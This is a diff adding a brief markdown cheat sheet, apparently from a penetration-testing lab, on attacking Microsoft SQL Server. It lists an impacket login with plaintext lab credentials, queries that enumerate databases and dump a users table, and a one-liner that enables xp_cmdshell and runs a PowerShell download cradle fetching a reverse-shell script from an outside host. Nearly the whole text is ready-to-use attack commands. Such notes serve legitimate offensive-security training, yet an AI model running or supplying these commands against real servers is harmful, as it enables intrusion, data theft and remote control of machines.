@@ -1,0 +1,18 @@
+---
+tags: [ database ]
+---
+
+## Connect to a DB
+
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+
+# Enumeration
+
+SELECT @@version;
+SELECT name FROM sys.databases;
+SELECT * FROM offsec.information_schema.tables;
+select * from offsec.dbo.users;
+
+# rce oneliner
+sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.185:8000/rev.ps1") | powershell -noprofile'
